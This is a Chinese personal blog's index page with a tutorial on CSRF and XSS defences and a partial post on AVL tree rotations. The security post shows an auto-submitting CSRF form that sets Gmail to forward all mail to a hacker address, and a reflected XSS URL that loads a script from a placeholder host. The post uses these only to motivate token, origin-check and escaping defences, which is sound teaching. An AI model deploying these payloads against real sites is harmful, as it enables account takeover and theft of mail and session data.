<!DOCTYPE html>
<html lang="ch">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="theme-color" content=#58b77a>
  <meta name="google-site-verification" content="tPpSuAWGh3t3CCi4iCkZx54tK6coKvwA7TYVj3p3v4I" />
  <title>ROBIN-3910</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="rob_曾洛镔">
  <meta name="keywords" content="">
  <meta name="description" content="rob的个人博客网站，记录编码/学习/生活日常">
  <script id="hexo-configurations">
  var CONFIG = {
    root: '/',
    theme: 'lx',
    version: '0.3.9',
    localsearch: {
      "enable": 'false',
      "trigger": "auto",
      "top_n_per_article": "1",
      "unescape": 'false',
      "preload": 'false'
    },
    path: '-'
  };
</script>

  <link rel="shortcut icon" href="/favicon.ico">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/css/main.min.css">
  <style type="text/css">
    pre,
    code {
      font-family: 'Fira Code', monospace;
    }
    html {
      font-family: sans-serif;
    }
    body {
      font-family: sans-serif;
    }
    h1, h2, h3, h4, h5, figure {
      font-family: sans-serif;
    }
    .menu-container{
      font-family: sans-serif;
    }
  </style>

  <script src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/js/jquery.jside.menu.js"></script>
	<script>
	$(document).ready(function(){
	$(".menu-container").jSideMenu({
	    jSidePosition: "position-right",
	    jSideSticky: true,
	    jSideSkin: "greenish",
	     });
	}); 
	</script>
  
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
<div id="page">

<div id="lx-aside" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/cover.jpeg)">
  <div class="overlay">
  <div class="featured">
    <div class="avatar"><a href="/"><img style="width: 100px;height: 100px;" src="/images/avatar.jpeg"></a></div>
    <span>rob_曾洛镔</span>
    <h1>ROBIN-3910</h1>
    <span>今天大刀🗡没带过来，就不砍你需求了</span>
    <div class="social-links">
    <a href="https://github.com/Robin3910" target="_blank"><i class="fa fa-github fa-fw"></i></a>
    <a href="robin3910@163.com" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
</div>
  </div>
  </div>
</div>

<div id="lx-main-content">
  <div class="lx-post"> 

  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/11/csrf/">服务器安全校验</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-11</span>
      <p><h2 id="前言介绍"><a href="#前言介绍" class="headerlink" title="前言介绍"></a>前言介绍</h2><p>服务器如果对所有请求内容一并接收的话，很容易带来很多安全风险问题，比如<code>CSRF</code>攻击、<code>XSS</code>攻击。所以，服务端的安全校验尤为重要，<br>不仅保障了服务的稳定性，也保证了用户的利益不受侵犯。</p>
<h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><h3 id="CSRF攻击（Cross-site-request-forgery跨站请求伪造）"><a href="#CSRF攻击（Cross-site-request-forgery跨站请求伪造）" class="headerlink" title="CSRF攻击（Cross site request forgery跨站请求伪造）"></a>CSRF攻击（Cross site request forgery跨站请求伪造）</h3><p><code>CSRF</code>攻击实例 - gmail邮箱的<code>CSRF</code>漏洞<br>这一天，大卫同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了大卫的注意：</p>
<pre><code>甩卖比特币，一个只要998！！
</code></pre>
<p>聪明的大卫当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。</p>
<p>果然，这只是一个什么都没有的空白页面，大卫失望的关闭了页面。一切似乎什么都没有发生……</p>
<p>在这平静的外表之下，黑客的攻击已然得手。大卫的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到<code>hacker@hackermail.com</code>。</p>
<p>大卫还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。</p>
<p>不久之后的一天，大卫发现自己的域名已经被转让了。懵懂的大卫以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，大卫才开始觉得不太对劲。</p>
<p>大卫仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。大卫回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_emc&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt;</span></span><br><span class="line">      .....</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;irf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;on&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nvp_bu_cftb&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Create Filter&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<pre><code>这个页面只要打开，就会向Gmail发送一个`post`请求。请求中，执行了“`Create Filter`”命令，将所有的邮件，转发    
到“`hacker@hackermail.com`”。
</code></pre>
<p>大卫由于刚刚就登陆了Gmail，所以这个请求发送时，携带着大卫的登录凭证（<code>Cookie</code>），</p>
<p>Gmail的后台接收到请求，验证了确实有大卫的登录凭证，于是成功给大卫配置了过滤器。</p>
<p>黑客可以查看大卫的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。</p>
<p>大卫很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……</p>
<p>以上就是大卫的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，<br>此事件原型是2007年Gmail的<code>CSRF</code>漏洞：<br><a target="_blank" rel="noopener" href="https://www.davidairey.com/google-Gmail-security-hijack/">Google’s Gmail security failure leaves my business sabotaged</a></p>
<h3 id="CSRF攻击的特点"><a href="#CSRF攻击的特点" class="headerlink" title="CSRF攻击的特点"></a>CSRF攻击的特点</h3><p>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的凭证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
<ul>
<li><p>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</p>
</li>
<li><p>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</p>
</li>
<li><p>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</p>
</li>
<li><p>跨站请求可以用各种方式：图片<code>URL</code>、超链接、<code>CORS</code>、<code>Form</code>提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</p>
</li>
</ul>
<h2 id="XSS攻击（Cross-site-scripting-跨站脚本攻击）"><a href="#XSS攻击（Cross-site-scripting-跨站脚本攻击）" class="headerlink" title="XSS攻击（Cross site scripting 跨站脚本攻击）"></a>XSS攻击（Cross site scripting 跨站脚本攻击）</h2><h3 id="XSS攻击实例-新浪微博名人堂反射型-XSS漏洞"><a href="#XSS攻击实例-新浪微博名人堂反射型-XSS漏洞" class="headerlink" title="XSS攻击实例 - 新浪微博名人堂反射型 XSS漏洞"></a>XSS攻击实例 - 新浪微博名人堂反射型 XSS漏洞</h3><p>攻击者发现 <a target="_blank" rel="noopener" href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a> 这个 <code>URL</code>的内容未经过滤直接输出到<code>HTML</code> 中。</p>
<p>于是攻击者构建出一个<code> URL</code>，然后诱导用户去点击：</p>
<pre><code>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;
</code></pre>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    &quot;&gt;按分类检索</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器接收到响应后就会加载执行恶意脚本<code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击<code>URL</code>，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“<code>XSS蠕虫</code>”。</p>
<h3 id="XSS攻击的特点"><a href="#XSS攻击的特点" class="headerlink" title="XSS攻击的特点"></a>XSS攻击的特点</h3><p> <code>Cross-Site Scripting</code>（跨站脚本攻击）简称<code> XSS</code>，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，<br>使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如<code>Cookie</code>、<code>SessionID</code> 等，进而危害数据安全。</p>
<p><code>XSS</code> 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
<ul>
<li><p>在 <code>HTML</code> 中内嵌的文本中，恶意内容以 script 标签形成注入。</p>
</li>
<li><p>在内联的 <code>JavaScript </code>中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p>
</li>
<li><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p>
</li>
<li><p>在标签的 <code>href</code>、<code>src</code> 等属性中，包含 <code>javascript:</code> 等可执行代码。</p>
</li>
<li><p>在 <code>onload</code>、<code>onerror</code>、<code>onclick</code> 等事件中，注入不受控制代码。</p>
</li>
</ul>
<h3 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a><code>XSS</code>攻击的分类</h3><h4 id="存储型XSS（数据库注入恶意代码，危害最大）"><a href="#存储型XSS（数据库注入恶意代码，危害最大）" class="headerlink" title="存储型XSS（数据库注入恶意代码，危害最大）"></a>存储型<code>XSS</code>（数据库注入恶意代码，危害最大）</h4><ol>
<li>攻击者将恶意代码提交到目标网站的数据库中。</li>
<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 <code>HTML</code> 中返回给浏览器。</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
<h4 id="反射型XSS（url-参数嵌入恶意代码）"><a href="#反射型XSS（url-参数嵌入恶意代码）" class="headerlink" title="反射型XSS（url`参数嵌入恶意代码）"></a>反射型XSS<code>（</code>url`参数嵌入恶意代码）</h4><ol>
<li>攻击者构造出特殊的 <code>URL</code>，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 <code>URL</code> 时，网站服务端将恶意代码从 <code>URL</code> 中取出，拼接在 <code>HTML</code> 中返回给浏览器。</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>反射型 <code>XSS</code> 漏洞常见于通过 <code>URL</code> 传递参数的功能，如网站搜索、跳转等。</p>
<h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS "></a><code>DOM</code> 型 <code>XSS </code></h4><ol>
<li>攻击者构造出特殊的 <code>URL</code>，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 <code>URL</code>。</li>
<li>用户浏览器接收到响应后解析执行，前端 <code>JavaScript</code> 取出 <code>URL</code> 中的恶意代码并执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p><code>DOM</code> 型 <code>XSS</code> 跟前两种 <code>XSS</code> 的区别：<code>DOM</code> 型 <code>XSS</code> 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 <code>JavaScript</code> 自身的安全漏洞，<br>而其他两种 <code>XSS</code> 都属于服务端的安全漏洞。</p>
<h2 id="服务器安全校验设计"><a href="#服务器安全校验设计" class="headerlink" title="服务器安全校验设计"></a>服务器安全校验设计</h2><h3 id="针对CSRF的防御策略"><a href="#针对CSRF的防御策略" class="headerlink" title="针对CSRF的防御策略"></a>针对<code>CSRF</code>的防御策略</h3><h4 id="1、同源验证防御"><a href="#1、同源验证防御" class="headerlink" title="1、同源验证防御"></a>1、同源验证防御</h4><p>可以通过阻止不明外域的访问来防御<code>CSRF</code>攻击，在<code>HTTP</code>协议中，每一个请求都会携带<code>Header</code>，<code>Header</code>中有字段用于标记域名来源：</p>
<ul>
<li><p>Origin Header</p>
</li>
<li><p>Referer Header</p>
</li>
</ul>
<h5 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h5><p>通过第三方域名发起的请求中，<code>Request Header</code>中的<code>Origin</code>字段指向了第三方域名，如果Origin<br>Header存在，服务端可以根据请求中的<code>Origin</code>字段进行判断该请求是否正常，如果来自于第三方站点，则拒绝该请求。</p>
<h5 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h5><p>在<code>HTTP Request Header</code>中有一个字段叫<code>Referer</code>，记录了该HTTP请求的来源地址。 对于<code>Ajax</code>请求，图片和<code>script</code>等资源请求，<code>Referer</code>为发起请求的页面地址。</p>
<p>由于<code>Origin</code>在请求头中不一定存在，<code>Referer</code>在某些情况下也是可以伪造或隐藏的，</p>
<p>所以，如果在请求头中，<code>Origin</code>以及<code>Referer</code>两个字段都不存在或者存在问题时，建议直接拒绝该请求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上所说的CSRF攻击属于第三方域名发起的攻击，通过同源验证也可以防范掉绝大部分的第三方域名CSRF攻击，但这并不是万无一失的。针对于本域直接发起的CSRF，比如攻击者有权限在页面下发布评论（比如链接、图片、富文本等，统称UGC：User Generated Content），那么就可以直接在本域发起攻击，这种情况下同源验证并不能抵御，所以需要服务端对关键接口做额外的防御措施。</span><br></pre></td></tr></table></figure>

<h4 id="2、使用Token"><a href="#2、使用Token" class="headerlink" title="2、使用Token"></a>2、使用<code>Token</code></h4><p> <strong>JSP服务端渲染的情况</strong> </p>
<ul>
<li><p>将CSRF Token写入页面中<br>可以在客户端请求页面时，生成一个<code>token</code>，该<code>token</code>通过加密算法对数据进行加密（一般包括了随机字符串和时间戳），然后将<code>token</code>写入服务端模板页面<code>form</code>标签和<code>a</code>标签中，再下发给客户端</p>
</li>
<li><p>页面发送请求时携带<code>token </code></p>
<p>客户端在发送请求时，会带上<code>token</code>标签，这是第三方域名发起请求无法做到的，比如：</p>
<p><code>get</code>请求：<a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue">http://url?csrftoken=tokenvalue</a></p>
<p><code>Post</code>请求：由于<code>form</code>表单中有：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tokenvalue&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>服务器验证<code>token</code> </p>
<p>服务器接收到客户端请求时，从请求中解析出<code>token</code>进行解密，对比加密字符串以及时间戳，如果加密的字符串一致且时间未过期，那么<code>token</code>就是有效的，可以执行相应的业务逻辑</p>
</li>
</ul>
<p><strong>前后端分离的情况</strong> </p>
<ul>
<li><p>将<code>token</code>写入<code>cookie</code>中</p>
</li>
<li><p>在用户登录时，写入<code>csrf-token</code>到客户端的<code>cookie</code>中，内容可以为随机字符串（如<code>csrfToken = v8g9e4ksfhw</code>）</p>
</li>
<li><p>在客户端发起请求时，将<code>cookie</code>中的<code>token</code>值取出，写入请求参数中</p>
</li>
<li><p>服务器接收到请求后，对比<code>cookie</code>中的<code>token</code>和请求参数中的<code>token</code>，如果一致，则请求有效，如果请求中<code>token</code>不存在或与<code>cookie</code>中的<code>token</code>不一致，则拒绝请求</p>
</li>
</ul>
<p>利用<code>token</code>防御的原理就在于：第三方域名发起跨站脚本攻击请求时，是通过冒用用户的身份来发起请求，但无法得知这个<code>token</code>，所以也无法在请求中加入<code>token</code>参数，从而实现对<code>CSRF</code>的防御。</p>
<h4 id="3、二次验证"><a href="#3、二次验证" class="headerlink" title="3、二次验证"></a>3、二次验证</h4><p>在关键请求提交时如转账，要求用户进行二次身份验证，如密码、图片验证码、短信验证码等。</p>
<h3 id="针对XSS的防御策略"><a href="#针对XSS的防御策略" class="headerlink" title="针对XSS的防御策略"></a>针对XSS的防御策略</h3><pre><code>思考问题：仅在前端做输入校验并进行过滤有用吗？
</code></pre>
<h4 id="预防反射型XSS"><a href="#预防反射型XSS" class="headerlink" title="预防反射型XSS"></a>预防反射型XSS</h4><p>该类<code>XSS</code>攻击常发生于服务端下发页面的情况下，服务器读取<code>Url</code>参数然后再写入<code>html</code>下发给浏览器。</p>
<p>针对于这种情况：</p>
<ol>
<li><p>需要对<code>html</code>做足充分的转义</p>
<p>如果拼接<code>HTML</code>是必要的，就需要采用一些合适的转义库，对<code>HTML</code>模板插入点进行充分的转义</p>
<p>常用的模板引擎比如<code>ejs</code>、<code>doT.js</code>等，对HTML的转义通常只有一个规则，就是把<code>&amp;&lt;&gt;&quot;&#39;/</code>这些字符转义掉，能起到一定的效果，但还不够完善，需要由开发者自行去补充，做到更加细致的转义策略。</p>
</li>
<li><p>可以改成前后端分离的结构，服务器下发静态资源，通过<code>ajax</code>请求拉取数据渲染页面。</p>
</li>
</ol>
<h4 id="预防存储型XSS"><a href="#预防存储型XSS" class="headerlink" title="预防存储型XSS"></a>预防存储型XSS</h4><p>该类<code>XSS</code>攻击通过将恶意代码上传到服务器数据库中，在用户打开页面的时候对页面的代码进行注入，这类攻击常见于评论展示、论坛发帖等页面中。</p>
<p>针对于该类攻击，最重要的预防策略：</p>
<pre><code>对用户提交的内容（UGC）进行充分的校验
并且在取出数据写入页面时进行转义，防止恶意代码直接写入HTML
</code></pre>
<p>此外，<code>XSS</code>攻击很多时候用于窃取用户信息，比如直接通过<code>document.cookie</code>进行页面中用户信息<code>cookie</code>的获取，服务端可以通过设置<code>cookie</code>的属性<code>http-only</code>为<code>true</code>，这样便可降低xss攻击带来的危害。</p>
<h4 id="预防DOM型XSS"><a href="#预防DOM型XSS" class="headerlink" title="预防DOM型XSS"></a>预防DOM型XSS</h4><ul>
<li><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 <code>HTML</code> 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code>等。</p>
</li>
<li><p>如果用 <code>Vue</code> 技术栈，不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，在前端 <code>render</code> 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 <code>XSS</code> 隐患。</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文对<code>CSRF</code>以及<code>XSS</code>的攻击进行了介绍，并阐述了两种攻击的各自的特点，也提供了一些防御措施。但在真正实践时，应该结合防御策略与自身实际的情况进行综合考虑。网络上没有绝对的安全，只有相对的防御，根据自身系统所需要的安全系数，做出相应的防御措施，在保证不被攻击的同时也能使投入产出比达到最优。</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin">Origin</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer</a></p>
<p><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">如何防止CSRF攻击？</a></p>
<p><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/09/27/fe-security.html">如何防止XSS攻击？</a></p>
<p><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">XXS-GAME</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/YvetteLau/Step-By-Step/issues/18">什么是XSS攻击，XSS攻击可以分为哪几类？如何防范XSS攻击？</a></p>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/11/csrf/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/10/avlTree/">AVL树TS实现</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-10</span>
      <p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>AVL树也称为平衡二叉树，AVL 树得名于它的发明者 G. M. Adelson-Velsky 和 Evgenii Landis，他们在1962年的论文《An algorithm for the organization of information》中公开了这一数据结构。</p>
<p>AVL是一种特殊的二叉搜索树，具备二叉搜索树的所有特点，且任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过 1（此高度差也称为平衡因子balance factor）。</p>
<h2 id="为何需要有平衡二叉搜索树"><a href="#为何需要有平衡二叉搜索树" class="headerlink" title="为何需要有平衡二叉搜索树"></a>为何需要有平衡二叉搜索树</h2><p>二叉搜索树一定程度上可以提高搜索效率，但是当原序列有序时，例如序列 A = {1，2，3，4，5，6}，</p>
<p>构造二叉搜索树如下图时 ，依据此序列构造的二叉搜索树为右斜树，同时二叉树退化成单链表，搜索效率降低为 O(n)。</p>
<img src="/images/avl/1.jpeg" width = "500" alt="1" align=center />

<p>在上述的二叉搜索树中查找元素 6 需要查找 6 次。</p>
<p>二叉搜索树的查找效率取决于树的高度，因此保持树的高度最小，即可保证树的查找效率。</p>
<p>同样的序列 A，将其改为下图的方式存储，查找元素 6 时只需比较 3 次，查找效率提升一倍。</p>
<img src="/images/avl/2.jpeg" width = "500" alt="1" align=center />



<h2 id="具体接口"><a href="#具体接口" class="headerlink" title="具体接口"></a>具体接口</h2><ul>
<li>往树中插入(insert)一个结点；</li>
<li>删除(remove)树中已经存在的某个结点；</li>
<li>搜索(search)树中某个结点；</li>
</ul>
<h2 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h2><ul>
<li>获取节点高度方法：treeHeight；</li>
<li>获取最大/最小节点方法：getMax/getMin；</li>
<li>判断某个节点是否平衡方法：getBalanceFactor；</li>
</ul>
<h2 id="平衡操作"><a href="#平衡操作" class="headerlink" title="平衡操作"></a>平衡操作</h2><p>相较于BST，AVL多了一步平衡操作，即在插入或者删除节点时，对树中不平衡的地方进行重新平衡，这是AVL树的精髓，但也是实现的难点所在。</p>
<p>对节点进行平衡之前，需要判断当前节点是否平衡，通过计算节点中左右子树的高度差来判断是否平衡，如果高度差绝对值超过1，则当前节点失衡，需要对其进行平衡操作。</p>
<p>平衡操作分为左旋和右旋：</p>
<img src="/images/avl/3.png" width = "500" alt="1" align=center />

<p>如上图所示，左图为对y节点进行右旋操作，有图为对x节点进行左旋操作，借助这张图片，可以写出左旋右旋的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  对节点y进行向右旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">    *        y                              x</span></span><br><span class="line"><span class="comment">    *       / \                           /   \</span></span><br><span class="line"><span class="comment">    *      x   T4     向右旋转 (y)        z     y</span></span><br><span class="line"><span class="comment">    *     / \       - - - - - - - -&gt;    / \   / \</span></span><br><span class="line"><span class="comment">    *    z   T3                       T1  T2 T3 T4</span></span><br><span class="line"><span class="comment">    *   / \</span></span><br><span class="line"><span class="comment">    * T1   T2</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rightRotate</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">const</span> leftNode = node.left;</span><br><span class="line">       node.left = leftNode.right;</span><br><span class="line">       leftNode.right = node;</span><br><span class="line">       <span class="keyword">return</span> leftNode;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 对节点y进行向左旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">    *    y                             x</span></span><br><span class="line"><span class="comment">    *  /  \                          /   \</span></span><br><span class="line"><span class="comment">    * T1   x      向左旋转 (y)       y     z</span></span><br><span class="line"><span class="comment">    *     / \   - - - - - - - -&gt;   / \   / \</span></span><br><span class="line"><span class="comment">    *   T2  z                     T1 T2 T3 T4</span></span><br><span class="line"><span class="comment">    *      / \</span></span><br><span class="line"><span class="comment">    *     T3 T4</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">leftRotate</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">const</span> rightNode = node.right;</span><br><span class="line">       node.right = rightNode.left;</span><br><span class="line">       rightNode.left = node;</span><br><span class="line">       <span class="keyword">return</span> rightNode;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>上述，是原理性的操作。在真实的情况下，会遇到四种可能出现的情况：</p>
<p><strong>case1：LL情况（左左情况）</strong></p>
<img src="/images/avl/4.png" width = "500" alt="1" align=center />

<p>上述情况，只需对z节点进行右旋操作即可</p>
<p><strong>case2：LR情况（左右情况）</strong></p>
<img src="/images/avl/5.png" width = "500" alt="1" align=center />


<p>上述情况，需要对Y节点进行左旋，再对Z节点进行右旋</p>
<p><strong>case3：RL情况（右左情况）</strong></p>
<img src="/images/avl/6.png" width = "500" alt="1" align=center />


<p>上述情况，需要对Y节点进行右旋，再对Z节点进行左旋</p>
<p><strong>case4：RR情况（右右情况）</strong></p>
<img src="/images/avl/7.png" width = "500" alt="1" align=center />


<p>上述情况，只需对z节点进行左旋操作即可。</p>
<p>TS具体实现</p>
